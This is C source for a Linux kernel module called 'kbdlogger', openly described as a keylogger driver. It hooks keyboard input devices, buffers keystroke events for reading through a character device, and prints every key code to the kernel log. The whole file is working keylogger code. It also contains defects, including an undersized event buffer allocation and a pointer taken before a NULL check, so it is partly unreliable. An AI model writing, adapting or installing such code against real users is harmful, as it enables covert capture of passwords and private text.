/*
 * kbdlogger driver
 *
 * Copyright (C) 2014 Rafael do Nascimento Pereira <rnp@25ghz.net>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * Keylogger driver - capture keypress events
 *
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/init.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/kobject.h>
#include <linux/time.h>
#include <linux/platform_device.h>
#include <linux/uaccess.h>
#include <linux/major.h>
#include <linux/wait.h>
#include <linux/sched.h>
#include <linux/input/mt.h>
#include <linux/hrtimer.h>
#include <linux/timer.h>
#include <linux/ktime.h>
#include <linux/poll.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include "../../drivers/input/input-compat.h"

#define NUMDEVS  1
#define DEVNAME  "kbdlogger"

#define KBDLOG_MINOR_BASE	64
#define KBDLOG_MINORS		32
#define KBDLOG_MIN_BUFFER_SIZE	64U
#define KBDLOG_BUF_PACKETS	8

enum evdev_clock_type {
	KBL_CLK_REAL = 0,
	KBL_CLK_MONO,
	KBL_CLK_BOOT,
	KBL_CLK_MAX
};

const char *kbdstr = "keyboard";

struct kbdlogger {
	int open;
	struct input_handle handle;
	wait_queue_head_t wait;
	struct list_head client_list;
	spinlock_t client_lock; /* protects client_list */
	struct mutex mutex;
	struct device dev;
	struct cdev cdev;
	bool exist;
	void *private;
};

struct client {
	unsigned int head;
	unsigned int tail;
	unsigned int packet_head;
	spinlock_t buffer_lock;
	struct fasync_struct *fasync;
	struct kbdlogger *kbdlogger;
	int clk_type;
	bool revoked;
	unsigned int bufsize;
	struct input_event buffer[];
};

static void __pass_event(struct client *client,
			 const struct input_event *event)
{
	client->buffer[client->head++] = *event;
	client->head &= client->bufsize - 1;

	if (unlikely(client->head == client->tail)) {
		/*
		 * This effectively "drops" all unconsumed events, leaving
		 * EV_SYN/SYN_DROPPED plus the newest event in the queue.
		 */
		client->tail = (client->head - 2) & (client->bufsize - 1);

		client->buffer[client->tail].time = event->time;
		client->buffer[client->tail].type = EV_SYN;
		client->buffer[client->tail].code = SYN_DROPPED;
		client->buffer[client->tail].value = 0;

		client->packet_head = client->tail;
	}

	if (event->type == EV_SYN && event->code == SYN_REPORT) {
		client->packet_head = client->head;
		kill_fasync(&client->fasync, SIGIO, POLL_IN);
	}
}

static void kbdlogger_pass_values(struct client *client,
				  const struct input_value *vals,
				  unsigned int count, ktime_t *kbdl_time)
{
	struct kbdlogger *kbdlogger = client->kbdlogger;
	const struct input_value *v;
	struct input_event event;
	bool wakeup = false;

	event.time = ktime_to_timeval(kbdl_time[client->clk_type]);

	/* Interrupts are disabled, just acquire the lock. */
	spin_lock(&client->buffer_lock);

	for (v = vals; v != vals + count; v++) {
		event.type = v->type;
		event.code = v->code;
		event.value = v->value;
		__pass_event(client, &event);
		if (v->type == EV_SYN && v->code == SYN_REPORT)
			wakeup = true;
	}

	spin_unlock(&client->buffer_lock);

	if (wakeup)
		wake_up_interruptible(&kbdlogger->wait);
}

static void kbdlogger_events(struct input_handle *handle,
			     const struct input_value *vals, unsigned int count)
{
	struct kbdlogger *kbdlogger = handle->private;
	struct client *client;
	ktime_t kbdl_time[KBL_CLK_MAX];

	kbdl_time[KBL_CLK_MONO] = ktime_get();
	kbdl_time[KBL_CLK_REAL] = ktime_mono_to_real(kbdl_time[KBL_CLK_MONO]);
	kbdl_time[KBL_CLK_BOOT] = ktime_mono_to_any(kbdl_time[KBL_CLK_MONO],
						 TK_OFFS_BOOT);

	client = kbdlogger->private;

	if (client)
		kbdlogger_pass_values(client, vals, count, kbdl_time);
	else
		pr_err("no client associated to this handle\n");
}

static void kbdlogger_event(struct input_handle *handle,
			unsigned int type, unsigned int code, int value)
{
	struct input_value vals[] = { { type, code, value } };

	pr_info("Key event. Dev: %s, Type: %d, Code: %d, Value: %d\n",
		dev_name(&handle->dev->dev), type, code, value);

	kbdlogger_events(handle, vals, 1);
}

static int kbdlogger_fasync(int fd, struct file *file, int on)
{
	struct client *client = file->private_data;

	return fasync_helper(fd, file, on, &client->fasync);
}

static int kbdlogger_flush(struct file *file, fl_owner_t id)
{
	struct client *client = file->private_data;
	struct kbdlogger *kbdlogger = client->kbdlogger;
	int retval;

	retval = mutex_lock_interruptible(&kbdlogger->mutex);
	if (retval)
		return retval;

	if (!kbdlogger->exist)
		retval = -ENODEV;
	else
		retval = input_flush_device(&kbdlogger->handle, file);

	mutex_unlock(&kbdlogger->mutex);
	return retval;
}

static void kbdlogger_free(struct device *dev)
{
	struct kbdlogger *kbdlogger = container_of(dev, struct kbdlogger, dev);

	input_put_device(kbdlogger->handle.dev);
	kfree(kbdlogger);
}

static int kbdlogger_open_device(struct kbdlogger *kbdlogger)
{
	int retval;

	retval = mutex_lock_interruptible(&kbdlogger->mutex);
	if (retval)
		return retval;

	if (!kbdlogger->exist)
		retval = -ENODEV;
	else if (!kbdlogger->open++) {
		retval = input_open_device(&kbdlogger->handle);
		if (retval)
			kbdlogger->open--;
	}

	mutex_unlock(&kbdlogger->mutex);
	return retval;
}

static void kbdlogger_close_device(struct kbdlogger *kbdlogger)
{
	mutex_lock(&kbdlogger->mutex);

	if (kbdlogger->exist && !--kbdlogger->open)
		input_close_device(&kbdlogger->handle);

	mutex_unlock(&kbdlogger->mutex);
}

static int kbdlogger_release(struct inode *inode, struct file *file)
{
	struct client *client = file->private_data;
	struct kbdlogger *kbdlogger = client->kbdlogger;

	input_release_device(&kbdlogger->handle);

	if (is_vmalloc_addr(client))
		vfree(client);
	else
		kfree(client);

	kbdlogger_close_device(kbdlogger);

	return 0;
}

static unsigned int kbdlogger_compute_buffer_size(struct input_dev *dev)
{
	unsigned int n_events =
		max(dev->hint_events_per_packet * KBDLOG_BUF_PACKETS,
		    KBDLOG_MIN_BUFFER_SIZE);

	return roundup_pow_of_two(n_events);
}

static int kbdlogger_open(struct inode *inode, struct file *file)
{
	struct kbdlogger *kbdlogger = container_of(inode->i_cdev, struct kbdlogger, cdev);
	unsigned int bufsize = kbdlogger_compute_buffer_size(kbdlogger->handle.dev);
	unsigned int size = sizeof(struct client) +
					sizeof(struct input_event);
	struct client *client;
	int error;

	client = kzalloc(size, GFP_KERNEL | __GFP_NOWARN);
	if (!client)
		client = vzalloc(size);
	if (!client)
		return -ENOMEM;

	client->bufsize = bufsize;
	spin_lock_init(&client->buffer_lock);
	client->kbdlogger = kbdlogger;
	//kbdlogger_attach_client(kbdlogger, client);
	kbdlogger->private = client;

	error = kbdlogger_open_device(kbdlogger);
	if (error)
		goto err_free_client;

	file->private_data = client;
	nonseekable_open(inode, file);

	return 0;

 err_free_client:
	kvfree(client);
	return error;
}

static int kbdlogger_fetch_next_event(struct client *client,
				   struct input_event *event)
{
	int have_event;

	spin_lock_irq(&client->buffer_lock);

	have_event = client->packet_head != client->tail;
	if (have_event) {
		*event = client->buffer[client->tail++];
		client->tail &= client->bufsize - 1;
	}

	spin_unlock_irq(&client->buffer_lock);

	return have_event;
}

static ssize_t kbdlogger_read(struct file *file, char __user *buffer,
			   size_t count, loff_t *ppos)
{
	struct client *client = file->private_data;
	struct kbdlogger *kbdlogger = client->kbdlogger;
	struct input_event event;
	size_t read = 0;
	int error;

	if (count != 0 && count < input_event_size())
		return -EINVAL;

	for (;;) {
		if (!kbdlogger->exist)
			return -ENODEV;

		if (client->packet_head == client->tail &&
		    (file->f_flags & O_NONBLOCK))
			return -EAGAIN;

		if (count == 0)
			break;

		while (read + input_event_size() <= count &&
			kbdlogger_fetch_next_event(client, &event)) {

			if (input_event_to_user(buffer + read, &event))
				return -EFAULT;

			read += input_event_size();
		}

		if (read)
			break;

		if (!(file->f_flags & O_NONBLOCK)) {
			error = wait_event_interruptible(kbdlogger->wait,
					client->packet_head != client->tail ||
					!kbdlogger->exist);
			if (error)
				return error;
		}

	}
	return 0;
}

static const struct file_operations kbdlogger_fops = {
	.owner		= THIS_MODULE,
	.open		= kbdlogger_open,
	.read		= kbdlogger_read,
	.release	= kbdlogger_release,
	.fasync		= kbdlogger_fasync,
	.flush		= kbdlogger_flush,
};

static void kbdlogger_mark_dead(struct kbdlogger *kbdlogger)
{
	mutex_lock(&kbdlogger->mutex);
	kbdlogger->exist = false;
	mutex_unlock(&kbdlogger->mutex);
}

static void kbdlogger_cleanup(struct kbdlogger *kbdlogger)
{
	struct input_handle *handle = &kbdlogger->handle;
	if (!kbdlogger)
		return;

	kbdlogger_mark_dead(kbdlogger);
	wake_up_interruptible(&kbdlogger->wait);
	cdev_del(&kbdlogger->cdev);

	if (handle) {
		input_flush_device(handle, NULL);
		input_close_device(handle);
	} else
		pr_err("input device already NULL\n");
}

static int kbdlogger_connect(struct input_handler *handler,
			     struct input_dev *dev,
			     const struct input_device_id *id)
{
	int error;
	int minor;
	int dev_no;
	struct kbdlogger *kbdlogger;

	/* if the device is not a keyboard it is filtered out. */
	if (!strstr(dev->name, kbdstr))
		return 0;

	minor = input_get_new_minor(KBDLOG_MINOR_BASE, KBDLOG_MINORS, true);
	if (minor < 0) {
		error = minor;
		pr_err("failed to reserve new minor: %d\n", error);
		return error;
	}

	kbdlogger = kzalloc(sizeof(struct kbdlogger), GFP_KERNEL);
	if (!kbdlogger) {
		error = -ENOMEM;
		goto err_free_minor;
	}

	INIT_LIST_HEAD(&kbdlogger->client_list);
	spin_lock_init(&kbdlogger->client_lock);
	mutex_init(&kbdlogger->mutex);
	init_waitqueue_head(&kbdlogger->wait);
	kbdlogger->exist = true;

	dev_no = minor;
	/* Normalize device number if it falls into legacy range */
	if (dev_no < KBDLOG_MINOR_BASE + KBDLOG_MINORS)
		dev_no -= KBDLOG_MINOR_BASE;
	dev_set_name(&kbdlogger->dev, "kbl_event%d", dev_no);

	kbdlogger->handle.dev = input_get_device(dev);  /* input_dev */
	kbdlogger->handle.name = dev_name(&kbdlogger->dev);
	kbdlogger->handle.handler = handler;
	kbdlogger->handle.private = kbdlogger;

	kbdlogger->dev.devt = MKDEV(INPUT_MAJOR, minor);
	kbdlogger->dev.class = &input_class;
	kbdlogger->dev.parent = &dev->dev; /* &(input_dev)->dev */
	kbdlogger->dev.release = kbdlogger_free;
	device_initialize(&kbdlogger->dev);

	error = input_register_handle(&kbdlogger->handle);
	if (error)
		goto err_free_kbdlogger;

	cdev_init(&kbdlogger->cdev, &kbdlogger_fops);
	kbdlogger->cdev.kobj.parent = &kbdlogger->dev.kobj;
	error = cdev_add(&kbdlogger->cdev, kbdlogger->dev.devt, 1);
	if (error)
		goto err_unregister_handle;

	error = device_add(&kbdlogger->dev);
	if (error)
		goto err_cleanup_kbdlogger;

	/* TODO: this function must be moved to kbl_open() */
	//error = input_open_device(&kbdlogger->handle);
	//if (error)
	//	goto err_cleanup_kbdlogger;

	pr_info("Added device %s\n", dev_name(&kbdlogger->dev));

	pr_info("Connected to device %s (%s at %s)\n",
		dev_name(&dev->dev),
		dev->name ?: "unknown",
		dev->phys ?: "unknown");

	return 0;

err_cleanup_kbdlogger:
	kbdlogger_cleanup(kbdlogger);
err_unregister_handle:
	input_unregister_handle(&kbdlogger->handle);
err_free_kbdlogger:
	put_device(&kbdlogger->dev);
err_free_minor:
	input_free_minor(minor);
	return error;
}

static void kbdlogger_disconnect(struct input_handle *handle)
{
	struct kbdlogger *kbdlogger = handle->private;

	device_del(&kbdlogger->dev);
	kbdlogger_cleanup(kbdlogger);

	input_free_minor(MINOR(kbdlogger->dev.devt));

	if (handle)
		input_unregister_handle(handle);
	else
		pr_err("input handle already NULL\n");

	put_device(&kbdlogger->dev);
	pr_info("Disconnected from device %s\n", dev_name(&handle->dev->dev));
}

static const struct input_device_id kbdlogger_ids[] = {
	{.driver_info = 1 },  /* driver_info = 1 ??  */
	{},
};

MODULE_DEVICE_TABLE(input, kbdlogger_ids);

static struct input_handler kbdlogger_handler = {
	.connect       = kbdlogger_connect,
	.disconnect    = kbdlogger_disconnect,
	.event         = kbdlogger_event,
	.id_table      = kbdlogger_ids,
	.legacy_minors = true,
	.name          = "kbdlogger_handler",
};

static int __init kbdlogger_init(void)
{
	int err;

	if (input_register_handler(&kbdlogger_handler)) {
		pr_err("Failed input handler register\n");
		err = -ENOMEM;
		goto fail;
	}

	pr_info("loaded %s\n", DEVNAME);
	return 0;
fail:
	pr_err("failed to init %s\n", DEVNAME);
	return err;
}

static void __exit kbdlogger_exit(void)
{
	input_unregister_handler(&kbdlogger_handler);
	pr_info("unloaded %s\n", DEVNAME);
}

module_init(kbdlogger_init);
module_exit(kbdlogger_exit);

MODULE_AUTHOR("Rafael do Nascimento Pereira <rnp@25ghz.net>");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Input driver keyboard logger");
